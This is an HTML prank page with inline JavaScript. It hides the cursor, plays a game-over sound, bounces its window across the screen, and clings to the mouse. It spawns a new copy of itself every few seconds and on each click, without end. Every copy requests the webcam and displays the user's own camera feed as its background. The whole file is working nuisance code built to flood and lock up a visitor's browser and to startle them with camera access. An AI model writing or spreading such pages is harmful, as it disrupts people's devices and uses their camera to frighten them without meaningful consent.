<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>JANNNMG</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            width: 350px;
            height: 350px;
            background-image: url('assets/game-over.gif');
            background-size: cover;
            background-position: center;
            overflow: hidden;
            cursor: none;
        }
        #webcamVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
            transform: scaleX(-1);
        }
    </style>
</head>
<body>
    <audio id="popupSound">
        <source src="assets/game-over-sound.mp3" type="audio/mpeg">
    </audio>
    
    <script>
        let x = Math.random() * (screen.availWidth - 350);
        let y = Math.random() * (screen.availHeight - 350);
        let vx = (Math.random() - 0.5) * 10;
        let vy = (Math.random() - 0.5) * 10;
        let stuckToCursor = false;
        
        const popupSound = document.getElementById('popupSound');
        
        async function setWebcamBackground() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const videoElement = document.createElement('video');
                videoElement.id = 'webcamVideo';
                videoElement.srcObject = stream;
                videoElement.autoplay = true;
                videoElement.muted = true;
                document.body.appendChild(videoElement);
                document.body.style.backgroundImage = 'none';
            } catch (error) {
                console.error("Error accessing webcam in popup:", error);
            }
        }

        function animate() {
            if (!stuckToCursor) {
                const screenWidth = screen.availWidth;
                const screenHeight = screen.availHeight;
                const windowWidth = window.outerWidth;
                const windowHeight = window.outerHeight;

                x += vx;
                y += vy;

                if (x + windowWidth > screenWidth || x < 0) {
                    vx = -vx;
                }
                if (y + windowHeight > screenHeight || y < 0) {
                    vy = -vy;
                }

                window.moveTo(x, y);
            }
            
            requestAnimationFrame(animate);
        }
        
        function createNewPopup() {
            setTimeout(() => {
                const newPopup = window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                if (newPopup) {
                    setTimeout(() => {
                        newPopup.postMessage({ action: 'startWebcam' }, '*');
                    }, 100);
                }
                createNewPopup();
            }, Math.random() * 2000 + 4000);
        }
        
        document.addEventListener('mousemove', function(e) {
            if (stuckToCursor) {
                window.moveTo(e.screenX - 175, e.screenY - 175);
            }
        });

        document.body.addEventListener('mouseenter', function() {
            stuckToCursor = true;
        });

        document.body.addEventListener('mouseleave', function() {
            stuckToCursor = false;
        });
        
        document.body.addEventListener('click', function() {
            const newPopup = window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
            if (newPopup) {
                setTimeout(() => {
                    newPopup.postMessage({ action: 'startWebcam' }, '*');
                }, 100);
            }
        });

        window.addEventListener('message', (event) => {
            if (event.data.action === 'startWebcam') {
                setWebcamBackground();
            }
        });
        
        window.onload = function() {
            animate();
            createNewPopup();
            popupSound.play();
        };
    </script>
</body>
</html>
